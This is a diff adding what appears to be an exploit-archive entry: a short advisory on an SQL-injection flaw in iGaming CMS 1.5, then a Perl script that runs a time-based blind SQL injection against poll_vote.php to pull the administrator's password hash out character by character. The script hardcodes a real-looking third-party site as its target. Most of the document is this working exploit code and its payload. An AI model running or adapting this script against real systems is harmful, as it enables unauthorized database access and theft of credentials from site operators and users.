@@ -1,0 +1,96 @@
+source: http://www.securityfocus.com/bid/29059/info
+
+iGaming CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+The issue affects iGaming CMS 1.5; other versions may also be affected. 
+
+#!/usr/bin/perl
+#===========================================================================================================================#
+#                                     _ ____             _        _ _                _                                      #
+#                          __ ___  __| |__ /_ _ ___     | |_  ___| | |_____ __ _____| |__       ___ _  _                    #
+#                         / _/ _ \/ _` ||_ \ '_|_ /  _  | ' \/ -_) | / _ \ V  V / -_) '_ \  _  / -_) || |                   #
+#                         \__\___/\__,_|___/_| /__| (_) |_||_\___|_|_\___/\_/\_/\___|_.__/ (_) \___|\_,_|                   #
+#===========================================================================================================================#
+#                                       iGaming 1.5 Remote Blind Sql Injection Exploit                                      #
+#===========================================================================================================================#
+#                                                      Author : Cod3rZ                                                      #
+#===========================================================================================================================#
+#                                              Site : http://cod3rz.helloweb.eu                                             #
+#                                          Site : http://devilsnight.altervista.org                                         #
+#===========================================================================================================================#
+# $result = $db->Execute("SELECT * FROM sp_polls_options WHERE id = '$_REQUEST[id]'");                                      #
+#===========================================================================================================================#
+# ?id=-1' OR (SELECT IF((ASCII(SUBSTRING(`PASS`,1,1))=48),benchmark(200000000,CHAR(0)),0) FROM sp_members WHERE `ID`=1)/*   #
+#===========================================================================================================================#
+# Thanks to: the man of the greetz, DreamMark                                                                               #
+#===========================================================================================================================#
+# Exploit based: Rossi46GO                                                                                                  #
+# Modded by: Cod3rZ                                                                                                         #
+#===========================================================================================================================#
+# Usage: perl ig.pl site                                                                                                    #
+#===========================================================================================================================#
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Time::HiRes;
+
+$ua = LWP::UserAgent->new;
+
+$site = "http://front-gamerz.com";
+
+if(!$site) { &usage; }
+@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
+
+sub usage {
+ print " Usage: perl ig.pl site \n";
+ print " Ex.: perl ig.pl http://127.0.0.1 \n";
+}
+sub request {
+ $var = $_[0];
+ $start = Time::HiRes::time();
+ $response = $ua->request(GET $var,s => $var);
+ $response->is_success() || print("$!\n");
+ $end = Time::HiRes::time();
+ $time = $end - $start;
+ return $time
+}
+sub refresh{
+ system("cls");
+ print " -------------------------------------------------\n";
+ print " iGaming 1.5 Remote Blind Sql Injection Exploit   \n";
+ print " Powered by Cod3rZ                                \n";
+ print " http://cod3rz.helloweb.eu                        \n";
+ print " -------------------------------------------------\n";
+ print " Please Wait..                                    \n";
+ print " Hash : " . $_[3] . "                             \n";
+ print " -------------------------------------------------\n";
+}
+for ($i = 1; $i < 33; $i++)
+ {
+  for ($j = 0; $j < 16; $j++)
+   {
+ $var = $site."/poll_vote.php?id=-1' OR (SELECT IF((ASCII(SUBSTRING(`PASS`,".$i.",1))=".$array[$j]."),benchmark(200000000,CHAR(0)),0) FROM sp_members WHERE `ID`=1)/*";
+ $time = request($var);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+if($time > 8)
+{
+ $time = request($var);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+ $hash .= chr($array[$j]);
+ refresh($host,$timedefault,$j,$hash,$time,$i);
+ $j=200;
+}
+
+}
+if($i == 1 && !$hash)
+{
+ print " Failed                                           \n";
+ print " -------------------------------------------------\n";
+ die();
+}
+if($i == 32) {
+ print " Exploit Terminated                               \n";
+ print " -------------------------------------------------\n ";
+ system('pause');
+}}
